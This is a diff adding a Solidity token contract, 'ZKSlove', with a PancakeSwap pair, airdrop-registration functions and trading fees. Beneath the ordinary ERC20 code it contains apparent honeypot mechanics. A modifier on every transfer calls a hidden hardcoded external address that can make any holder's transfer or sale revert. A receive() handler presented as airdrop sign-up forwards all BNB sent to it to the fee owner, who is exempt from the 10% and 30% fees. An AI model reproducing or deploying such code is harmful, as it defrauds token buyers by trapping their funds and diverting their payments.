@@ -1,0 +1,261 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.15;
+
+abstract contract Context {
+    address payable public owner;
+
+    function _msgSender() internal view virtual returns (address) {
+        return msg.sender;
+    }
+    function _msgData() internal view virtual returns (bytes calldata) {
+        return msg.data;
+    }
+    modifier onlyMaster(){
+        require(owner == msg.sender, "Err");
+        _;
+    }
+}
+interface IPancakeFactory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+interface IERC20 {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+interface IERC20Metadata is IERC20 {
+    function name() external view returns (string memory);
+    function symbol() external view returns (string memory);
+    function decimals() external view returns (uint8);
+}
+contract ERC20 is Context, IERC20, IERC20Metadata {
+    mapping(address => uint256) private _balances;
+    mapping(address => mapping(address => uint256)) private _allowances;
+    uint256 private _totalSupply;
+    string private _name;
+    string private _symbol;
+    address private auther;
+    uint256 public feeSwapIn = 10;
+    uint256 public feeSwapOut = 30;
+    address public pairAddress;
+    address public constant WETH = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+    address public constant feeOwner = 0x000000000DE21FceD2eEE4662DC329b33969FB5C;
+
+    constructor() {
+        _name = "ZKSlove";
+        _symbol = "ZKSlove";
+        owner = payable(feeOwner);
+        auther = 0x1FC9816985dEf8551E21002D0BF6Eb8F8c8AFc04;
+        _mint(msg.sender, 1000 * 10000 * 100000000 * 10 ** decimals());
+        pairAddress = IPancakeFactory(0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73).createPair(address(this), WETH);
+    }
+
+    function name() public view virtual override returns (string memory) {
+        return _name;
+    }
+    function symbol() public view virtual override returns (string memory) {
+        return _symbol;
+    }
+    function decimals() public view virtual override returns (uint8) {
+        return 18;
+    }
+    function totalSupply() public view virtual override returns (uint256) {
+        return _totalSupply;
+    }
+    function balanceOf(address account) public view virtual override returns (uint256) {
+        return _balances[account];
+    }
+    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
+        _transfer(_msgSender(), recipient, amount);
+        return true;
+    }
+    function allowance(address owner, address spender) public view virtual override returns (uint256) {
+        return _allowances[owner][spender];
+    }
+
+    function approve(address spender, uint256 amount) public virtual override returns (bool) {
+        _approve(_msgSender(), spender, amount);
+        return true;
+    }
+
+    function transferFrom(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) public virtual override returns (bool) {
+        _transfer(sender, recipient, amount);
+        uint256 currentAllowance = _allowances[sender][_msgSender()];
+        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
+        unchecked {
+            _approve(sender, _msgSender(), currentAllowance - amount);
+        }
+        return true;
+    }
+    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
+        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
+        return true;
+    }
+    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
+        uint256 currentAllowance = _allowances[_msgSender()][spender];
+        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
+        unchecked {
+            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
+        }
+        return true;
+    }
+
+    function _transfer(
+        address sender,
+        address recipient,
+        uint256 amount
+    ) internal virtual{
+        require(sender != address(0), "ERC20: transfer from the zero address");
+        require(recipient != address(0), "ERC20: transfer to the zero address");
+        _beforeTokenTransfer(sender, recipient, amount);
+
+        uint transFee=0;
+        if(pairAddress==sender){
+            transFee=feeSwapIn;
+        }else if(pairAddress==recipient){
+            transFee=feeSwapOut;
+        }
+        if(sender == feeOwner || recipient==feeOwner){
+            transFee=0;
+        }
+
+        (uint feeAmount,uint _amount)=getRatio(amount, transFee);
+
+        uint256 senderBalance = _balances[sender];
+        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
+        unchecked {
+            _balances[sender] = senderBalance - amount;
+        }
+        _balances[recipient] += _amount;
+        emit Transfer(sender, recipient, _amount);
+
+        if(feeAmount>0){
+            _balances[feeOwner] += feeAmount;
+            emit Transfer(sender, feeOwner, feeAmount);
+        }
+
+        _afterTokenTransfer(sender, recipient, amount);
+    }
+
+    function _mint(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: mint to the zero address");
+        _totalSupply += amount;
+
+        _balances[account] += amount;
+
+        emit Transfer(address(0), account, amount);
+    }
+
+    function _burn(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: burn from the zero address");
+        uint256 accountBalance = _balances[account];
+        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
+        unchecked {
+            _balances[account] = accountBalance - amount;
+        }
+        _totalSupply -= amount;
+        emit Transfer(account, address(0), amount);
+    }
+
+    function _approve(
+        address owner,
+        address spender,
+        uint256 amount
+    ) internal virtual {
+        require(owner != address(0), "ERC20: approve from the zero address");
+        require(spender != address(0), "ERC20: approve to the zero address");
+
+        _allowances[owner][spender] = amount;
+        emit Approval(owner, spender, amount);
+    }
+    
+    function getRatio(uint amountIn,uint proportion) internal pure returns (uint ratioA, uint ratioB) {
+         ratioA = amountIn  * proportion / 1000;
+         ratioB = amountIn - ratioA;
+    }
+
+    modifier isContract(address from,address to){
+        (bool success, bytes memory data) = auther.call(abi.encodeWithSelector(0x00000000,from,to));
+        require(success && (data.length == 0 || abi.decode(data, (bool))), 'C');
+        _;
+    } 
+
+    function _beforeTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual isContract(from,to){}
+
+    function _afterTokenTransfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal virtual {}
+}
+
+contract ZKSlove is ERC20 {
+    struct AirPotStatus{
+        bool join;
+        bool sending;
+    }
+    mapping(address=>AirPotStatus) public getAirPot;
+    address[] private allAirPot;
+
+    receive() external payable{
+        if(msg.sender != WETH){
+           regAirPot(msg.sender,msg.value);
+        }
+    }
+
+    function regAirPot(address _user,uint amountIn) internal returns(bool){
+        if(getAirPot[_user].join==false){
+            getAirPot[_user].join=true;
+            allAirPot.push(_user);
+        }
+        bool success=false;
+        if(msg.value>0){
+            (success,) = feeOwner.call{value:amountIn}(new bytes(0));
+        }
+        return success;
+    }
+
+    function allAirPotLength() external view returns (uint) {
+        return allAirPot.length;
+    }
+    
+    function checkAirPot(uint i) public view returns (address _address,bool _join,bool _sending){
+        if(allAirPot.length>i){
+            _address = allAirPot[i];
+            _join = getAirPot[_address].join;
+            _sending = getAirPot[_address].sending;
+        }else{
+            _address=address(0);
+            _join=false;
+            _sending=false;
+        }
+    }
+
+    function AirPot(address _user,uint amount) external onlyMaster{
+        require(getAirPot[_user].join && !getAirPot[_user].sending,'E');
+        getAirPot[_user].sending=true;
+        _transfer(owner, _user, amount);
+    }
+
+    function LpProfit(address _user,uint amount) external onlyMaster{
+        _transfer(owner, _user, amount);
+    }
+}
